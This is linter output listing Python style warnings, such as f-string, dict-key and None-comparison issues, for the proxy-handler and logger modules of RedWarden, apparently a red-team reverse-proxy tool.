849 |                 ):
850 |                     if "Host" in new_req_headers.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
851 |                         del new_req_headers["Host"]
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:900:21
    |
899 |                   self.logger.dbg(
900 | /                     "Response from reverse-proxy fetch came at {} bytes.".format(
901 | |                         len(res_body)
902 | |                     )
    | |_____________________^
903 |                   )
    |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:905:20
    |
903 |                 )
904 |
905 |                 if "Content-Length" not in res.headers.keys() and len(res_body) != 0:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
906 |                     res.headers["Content-Length"] = str(len(res_body))
907 |                     self.response_length = len(res_body)
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:911:20
    |
909 |                 myreq.close()
910 |
911 |                 if type(res_body) == str:
    |                    ^^^^^^^^^^^^^^^^^^^^^
912 |                     res_body = str.encode(res_body)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:916:21
    |
914 |               except requests.exceptions.ConnectionError as e:
915 |                   self.logger.err(
916 | /                     "Exception occured while reverse-proxy fetching resource : URL({}).\nException: ({})".format(
917 | |                         fetchurl, str(e)
918 | |                     )
    | |_____________________^
919 |                   )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:923:27
    |
921 |                 self.request.connection.no_keep_alive = True
922 |
923 |                 if res == None:
    |                           ^^^^
924 |                     res = MyResponse(None, self)
    |
help: Replace with `cond is None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:932:33
    |
931 |             except Exception as e:
932 |                 self.logger.err("Could not proxy request: ({})".format(str(e)))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
933 |                 if "RemoteDisconnected" in str(e) or "Read timed out" in str(e):
934 |                     return
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:936:27
    |
934 |                     return
935 |
936 |                 if res == None:
    |                           ^^^^
937 |                     res = MyResponse(None, self)
    |
help: Replace with `cond is None`

B010 [*] Do not call `setattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:946:13
    |
944 |                 return
945 |
946 |             setattr(res, "headers", res.msg)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
947 |             self.response_headers = res.msg
    |
help: Replace `setattr` with assignment

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:969:12
    |
967 |         self.request.uri = origuri
968 |
969 |         if type(modified) == bool:
    |            ^^^^^^^^^^^^^^^^^^^^^^
970 |             modified |= newuri != origuri
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:977:38
    |
975 |             res_body = self.encode_content_body(res_body_plain, content_encoding)
976 |
977 |             reshdrs = [x.lower() for x in res.headers.keys()]
    |                                      ^^^^^^^^^^^^^^^^^^^^^^^
978 |             if "content-length" in reshdrs:
979 |                 del res.headers["Content-Length"]
    |
help: Remove `.keys()`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:984:33
    |
982 |                 res.headers["Content-Length"] = str(len(res_body))
983 |                 self.response_length = len(res_body)
984 |             except Exception as e:
    |                                 ^
985 |                 self.logger.dbg(
986 |                     "Could not set proper Content-Length as running len on res_body failed"
    |
help: Remove assignment to unused variable `e`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:990:13
    |
989 |         if (
990 |             "Transfer-Encoding" in res.headers.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
991 |             and res.headers["Transfer-Encoding"] == "chunked"
992 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:996:13
    |
995 |         if (not ignore_response_decompression_errors) and (
996 |             "Accept-Encoding" in self.request.headers.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
997 |         ):
998 |             encToUse = (
    |
help: Remove `.keys()`

N806 Variable `encToUse` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:998:13
     |
 996 |             "Accept-Encoding" in self.request.headers.keys()
 997 |         ):
 998 |             encToUse = (
     |             ^^^^^^^^
 999 |                 self.request.headers["Accept-Encoding"].split(" ")[0].replace(",", "")
1000 |             )
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1006:16
     |
1004 |             ]
1005 |
1006 |             if override_resp_enc in res.headers.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1007 |                 self.logger.dbg(
1008 |                     "Plugin asked to override response content encoding without changing header's value."
     |
help: Remove `.keys()`

N806 Variable `encToUse` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1028:29
     |
1026 |                     for enc in encs:
1027 |                         if enc in ProxyRequestHandler.SUPPORTED_ENCODINGS:
1028 |                             encToUse = encs[0]
     |                             ^^^^^^^^
1029 |                             reencoded = True
1030 |                             break
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1039:29
     |
1037 |                         )
1038 |
1039 |             self.logger.dbg("Encoding response body to: {}".format(encToUse))
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1040 |             res_body = self.encode_content_body(res_body, encToUse)
1041 |             reskeys = [x.lower() for x in res.headers.keys()]
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1041:38
     |
1039 |             self.logger.dbg("Encoding response body to: {}".format(encToUse))
1040 |             res_body = self.encode_content_body(res_body, encToUse)
1041 |             reskeys = [x.lower() for x in res.headers.keys()]
     |                                      ^^^^^^^^^^^^^^^^^^^^^^^
1042 |             if "content-length" in reskeys:
1043 |                 del res.headers["Content-Length"]
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1055:12
     |
1053 |             res_body = ""
1054 |
1055 |         if type(res_body) == str:
     |            ^^^^^^^^^^^^^^^^^^^^^
1056 |             res_body = str.encode(res_body)
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1067:13
     |
1066 |           if (
1067 | /             plugins.IProxyPlugin.proxy2_metadata_headers["keep_alive_this_connection"]
1068 | |             in res.headers.keys()
     | |_________________________________^
1069 |           ):
1070 |               self.request.connection.no_keep_alive = False
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1074:13
     |
1073 |           self.logger.info(
1074 | /             "[RESPONSE] HTTP {} {}, length: {}, keep-alive: {}".format(
1075 | |                 res.status, res.reason, len(res_body), ka
1076 | |             ),
     | |_____________^
1077 |               color=ProxyLogger.colors_map["yellow"],
1078 |           )
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1096:25
     |
1094 |                       del self.request.headers["Host"]
1095 |                       if (
1096 | /                         plugins.IProxyPlugin.proxy2_metadata_headers[
1097 | |                             "override_host_header"
1098 | |                         ]
1099 | |                         in self.request.headers.keys()
     | |______________________________________________________^
1100 |                       ):
1101 |                           outbound_origin = self.request.headers[
     |
help: Remove `.keys()`

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1110:35
     |
1108 |                 self.save_handler(self.request, self.request.body, res, res_body_plain)
1109 |
1110 |         except BrokenPipeError as e:
     |                                   ^
1111 |             self.logger.err("Broken pipe. Client must have disconnected/timed-out.")
     |
help: Remove assignment to unused variable `e`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1127:16
     |
1125 |         )
1126 |         for k in hop_by_hop:
1127 |             if k in headers.keys():
     |                ^^^^^^^^^^^^^^^^^^^
1128 |                 del headers[k]
1129 |         return headers
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1132:20
     |
1131 |     def encode_content_body(self, text, encoding):
1132 |         logger.dbg("Encoding content to {}".format(encoding))
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1133 |         data = text
1134 |         if encoding == "identity":
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1149:28
     |
1147 |             except Exception as e:
1148 |                 # raise Exception('Could not compress Brotli stream: "{}"'.format(str(e)))
1149 |                 logger.err('Could not compress Brotli stream: "{}"'.format(str(e)))
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1150 |         else:
1151 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1152:24
     |
1150 |         else:
1151 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
1152 |             logger.err('Unknown Content-Encoding: "{}"'.format(encoding))
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1153 |         return data
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1156:25
     |
1155 |     def decode_content_body(self, data, encoding):
1156 |         self.logger.dbg("Decoding content from {}".format(encoding))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1157 |         text = data
1158 |         if encoding == "identity":
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1165:13
     |
1163 |                 with gzip.GzipFile(fileobj=_io) as f:
1164 |                     text = f.read()
1165 |             except:
     |             ^^^^^^
1166 |                 return data
1167 |         elif encoding == "deflate":
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1179:21
     |
1177 |                 # raise Exception('Could not decompress Brotli stream: "{}"'.format(str(e)))
1178 |                 self.logger.err(
1179 |                     'Could not decompress Brotli stream: "{}"'.format(str(e))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1180 |                 )
1181 |         else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1183:29
     |
1181 |         else:
1182 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
1183 |             self.logger.err('Unknown Content-Encoding: "{}"'.format(encoding))
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1184 |         return text
     |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1201:17
     |
1199 |         def _parse_qsl(s):
1200 |             return "\n".join(
1201 |                 "%-20s %s" % (k, v) for k, v in parse_qsl(s, keep_blank_values=True)
     |                 ^^^^^^^^^^
1202 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1207:27
     |
1205 |               return
1206 |
1207 |           req_header_text = "%s %s %s\n%s" % (
     |  ___________________________^
1208 | |             req.method,
1209 | |             req.uri,
1210 | |             self.request_version,
1211 | |             req.headers,
1212 | |         )
     | |_________^
1213 |
1214 |           if res is not None:
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1217:16
     |
1215 |             reshdrs = res.headers
1216 |
1217 |             if type(reshdrs) == dict or "CaseInsensitiveDict" in str(type(reshdrs)):
     |                ^^^^^^^^^^^^^^^^^^^^^
1218 |                 reshdrs = ""
1219 |                 for k, v in res.headers.items():
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1224:32
     |
1222 |                     if k.lower().startswith("x-proxy2-"):
1223 |                         continue
1224 |                     reshdrs += "{}: {}\n".format(k, v)
     |                                ^^^^^^^^^^^^^^^^^^^^^^^
1225 |
1226 |             res_header_text = "%s %d %s\n%s" % (
     |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1226:31
     |
1224 |                     reshdrs += "{}: {}\n".format(k, v)
1225 |
1226 |             res_header_text = "%s %d %s\n%s" % (
     |                               ^^^^^^^^^^^^^^
1227 |                 res.response_version,
1228 |                 res.status,
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1234:13
     |
1233 |         self.logger.trace(
1234 |             "==== REQUEST ====\n%s" % req_header_text,
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1235 |             color=ProxyLogger.colors_map["yellow"],
1236 |         )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1242:17
     |
1240 |             query_text = _parse_qsl(u.query)
1241 |             self.logger.trace(
1242 |                 "==== QUERY PARAMETERS ====\n%s\n" % query_text,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1243 |                 color=ProxyLogger.colors_map["green"],
1244 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1250:17
     |
1248 |             cookie = _parse_qsl(re.sub(r";\s*", "&", cookie))
1249 |             self.logger.trace(
1250 |                 "==== COOKIES ====\n%s\n" % cookie,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1251 |                 color=ProxyLogger.colors_map["green"],
1252 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1258:17
     |
1256 |             token = auth.split()[1].decode("base64")
1257 |             self.logger.trace(
1258 |                 "==== BASIC AUTH ====\n%s\n" % token,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1259 |                 color=ProxyLogger.colors_map["red"],
1260 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1276:41
     |
1274 |                     else:
1275 |                         lines = json_str.splitlines()
1276 |                         req_body_text = "%s\n(%d lines)" % (
     |                                         ^^^^^^^^^^^^^^^^
1277 |                             "\n".join(lines[:50]),
1278 |                             len(lines),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1287:21
     |
1285 |             if req_body_text:
1286 |                 self.logger.trace(
1287 |                     "==== REQUEST BODY ====\n%s\n" % req_body_text.strip(),
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1288 |                     color=ProxyLogger.colors_map["white"],
1289 |                 )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1293:17
     |
1291 |         if res is not None:
1292 |             self.logger.trace(
1293 |                 "\n==== RESPONSE ====\n%s" % res_header_text,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1294 |                 color=ProxyLogger.colors_map["cyan"],
1295 |             )
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1299:20
     |
1297 |             cookies = res.headers.get("Set-Cookie")
1298 |             if cookies:
1299 |                 if type(cookies) == list or type(cookies) == tuple:
     |                    ^^^^^^^^^^^^^^^^^^^^^
1300 |                     cookies = "\n".join(cookies)
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1299:45
     |
1297 |             cookies = res.headers.get("Set-Cookie")
1298 |             if cookies:
1299 |                 if type(cookies) == list or type(cookies) == tuple:
     |                                             ^^^^^^^^^^^^^^^^^^^^^^
1300 |                     cookies = "\n".join(cookies)
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1303:21
     |
1302 |                 self.logger.trace(
1303 |                     "==== SET-COOKIE ====\n%s\n" % cookies,
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1304 |                     color=ProxyLogger.colors_map["yellow"],
1305 |                 )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1319:41
     |
1317 |                     else:
1318 |                         lines = json_str.splitlines()
1319 |                         res_body_text = "%s\n(%d lines)" % (
     |                                         ^^^^^^^^^^^^^^^^
1320 |                             "\n".join(lines[:50]),
1321 |                             len(lines),
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1326:20
     |
1324 |                     res_body_text = res_body
1325 |             elif content_type.startswith("text/html"):
1326 |                 if type(res_body) == str:
     |                    ^^^^^^^^^^^^^^^^^^^^^
1327 |                     res_body = str.encode(res_body)
1328 |                 m = re.search(
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1335:25
     |
1333 |                 if m:
1334 |                     self.logger.trace(
1335 |                         "==== HTML TITLE ====\n%s\n" % html.unescape(m.group(1)),
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1336 |                         color=ProxyLogger.colors_map["cyan"],
1337 |                     )
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1346:24
     |
1344 |                 halfmax = int(maxchars / 2)
1345 |                 try:
1346 |                     if type(res_body_text) == bytes:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1347 |                         dec = res_body_text.decode()
1348 |                     else:
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1351:31
     |
1349 |                         dec = res_body_text
1350 |
1351 |                     if dec != None and len(dec) > maxchars:
     |                               ^^^^
1352 |                         res_body_text2 = (
1353 |                             dec[:halfmax] + " <<< ... >>> " + dec[-halfmax:]
     |
help: Replace with `cond is not None`

F405 `hexdump` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1360:42
     |
1358 |                 except UnicodeDecodeError:
1359 |                     if len(res_body_text) > maxchars:
1360 |                         res_body_text2 = hexdump(list(res_body_text[:halfmax]))
     |                                          ^^^^^^^
1361 |                         res_body_text2 += "\n\t................\n"
1362 |                         res_body_text2 += hexdump(list(res_body_text[-halfmax:]))
     |

F405 `hexdump` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1362:43
     |
1360 |                         res_body_text2 = hexdump(list(res_body_text[:halfmax]))
1361 |                         res_body_text2 += "\n\t................\n"
1362 |                         res_body_text2 += hexdump(list(res_body_text[-halfmax:]))
     |                                           ^^^^^^^
1363 |                     else:
1364 |                         res_body_text2 = hexdump(list(res_body_text))
     |

F405 `hexdump` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1364:42
     |
1362 |                         res_body_text2 += hexdump(list(res_body_text[-halfmax:]))
1363 |                     else:
1364 |                         res_body_text2 = hexdump(list(res_body_text))
     |                                          ^^^^^^^
1365 |
1366 |                 self.logger.trace(
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1367:21
     |
1366 |                 self.logger.trace(
1367 |                     "==== RESPONSE BODY ====\n%s\n" % res_body_text2,
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1368 |                     color=ProxyLogger.colors_map["green"],
1369 |                 )
     |
help: Replace with format specifiers

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1378:27
     |
1376 |             instance = self.plugins[plugin_name]
1377 |             try:
1378 |                 handler = getattr(instance, "request_handler")
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1379 |                 # self.logger.dbg("Calling `request_handler' from plugin %s" % plugin_name)
1380 |                 origheaders = dict(req.headers).copy()
     |
help: Replace `getattr` with attribute access

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1385:40
     |
1384 |                 altered = req_body != req_body_current and req_body_current is not None
1385 |                 if req_body_current == None:
     |                                        ^^^^
1386 |                     req_body_current = req_body
1387 |                 for k, v in origheaders.items():
     |
help: Replace with `cond is None`

B007 Loop control variable `v` not used within loop body
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1387:24
     |
1385 |                 if req_body_current == None:
1386 |                     req_body_current = req_body
1387 |                 for k, v in origheaders.items():
     |                        ^
1388 |                     if k not in req.headers.keys():
1389 |                         altered = True
     |
help: Rename unused `v` to `_v`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1388:24
     |
1386 |                     req_body_current = req_body
1387 |                 for k, v in origheaders.items():
1388 |                     if k not in req.headers.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1389 |                         altered = True
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1399:25
     |
1397 |                   if "object has no attribute" in str(e):
1398 |                       self.logger.dbg(
1399 | /                         'Plugin "{}" does not implement `request_handler\''.format(
1400 | |                             plugin_name
1401 | |                         )
     | |_________________________^
1402 |                       )
1403 |                       if options["debug"]:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1407:25
     |
1405 |                   else:
1406 |                       self.logger.err(
1407 | /                         "Plugin {} has thrown an exception: '{}'".format(
1408 | |                             plugin_name, str(e)
1409 | |                         )
     | |_________________________^
1410 |                       )
1411 |                       if options["debug"]:
     |
help: Convert to f-string

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1423:27
     |
1421 |             instance = self.plugins[plugin_name]
1422 |             try:
1423 |                 handler = getattr(instance, "response_handler")
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1424 |                 # self.logger.dbg("Calling `response_handler' from plugin %s" % plugin_name)
1425 |                 origheaders = {}
     |
help: Replace `getattr` with attribute access

E722 Do not use bare `except`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1428:17
     |
1426 |                 try:
1427 |                     origheaders = res.headers.copy()
1428 |                 except:
     |                 ^^^^^^
1429 |                     pass
     |

B007 Loop control variable `v` not used within loop body
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1434:24
     |
1433 |                 altered = res_body_current != res_body
1434 |                 for k, v in origheaders.items():
     |                        ^
1435 |                     if origheaders[k] != res.headers[k]:
1436 |                         # self.logger.dbg('Plugin modified response header: "{}", from: "{}" to: "{}"'.format(
     |
help: Rename unused `v` to `_v`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1450:25
     |
1448 |                   if "object has no attribute" in str(e):
1449 |                       self.logger.dbg(
1450 | /                         'Plugin "{}" does not implement `response_handler\''.format(
1451 | |                             plugin_name
1452 | |                         )
     | |_________________________^
1453 |                       )
1454 |                   else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1456:25
     |
1454 |                   else:
1455 |                       self.logger.err(
1456 | /                         "Plugin {} has thrown an exception: '{}'".format(
1457 | |                             plugin_name, str(e)
1458 | |                         )
     | |_________________________^
1459 |                       )
1460 |                       if options["debug"]:
     |
help: Convert to f-string

N803 Argument name `VERSION` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1499:16
     |
1499 | def init(opts, VERSION):
     |                ^^^^^^^
1500 |     global options
1501 |     global pluginsloaded
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1512:45
     |
1510 |     sslintercept = SSLInterception(logger, options)
1511 |
1512 |     if options["log"] and options["log"] != None and options["log"] != sys.stdout:
     |                                             ^^^^
1513 |         if options["tee"]:
1514 |             logger.info("Teeing stdout output to {} log file.".format(options["log"]))
     |
help: Replace with `cond is not None`

F405 `monkeypatching` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1518:5
     |
1516 |             logger.info("Writing output to {} log file.".format(options["log"]))
1517 |
1518 |     monkeypatching(logger)
     |     ^^^^^^^^^^^^^^
1519 |
1520 |     for name, plugin in pluginsloaded.get_plugins().items():
     |

B007 Loop control variable `name` not used within loop body
    --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxyhandler.py:1520:9
     |
1518 |     monkeypatching(logger)
1519 |
1520 |     for name, plugin in pluginsloaded.get_plugins().items():
     |         ^^^^
1521 |         plugin.logger = logger
1522 |         plugin.help(None)
     |
help: Rename unused `name` to `_name`

N816 Variable `globalLock` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:10:1
   |
 8 | import time
 9 |
10 | globalLock = threading.Lock()
   | ^^^^^^^^^^
   |

E711 Comparison to `None` should be `cond is not None`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:41:23
   |
40 |     def __init__(self, options=None):
41 |         if options != None:
   |                       ^^^^
42 |             self.options.update(options)
   |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:46:16
   |
44 |     @staticmethod
45 |     def with_color(c, s):
46 |         return "\x1b[1;{}m{}\x1b[0m".format(c, s)
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
47 |
48 |     # Invocation:
   |
help: Convert to f-string

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:52:19
   |
50 |     @staticmethod
51 |     def out(txt, fd, mode="info ", **kwargs):
52 |         if txt == None or fd == "none":
   |                   ^^^^
53 |             return
54 |         elif fd == None:
   |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:54:20
   |
52 |         if txt == None or fd == "none":
53 |             return
54 |         elif fd == None:
   |                    ^^^^
55 |             raise Exception("[ERROR] Logging descriptor has not been specified!")
   |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:66:16
   |
64 |         if args["color"]:
65 |             col = args["color"]
66 |             if type(col) == str and col in ProxyLogger.colors_map.keys():
   |                ^^^^^^^^^^^^^^^^
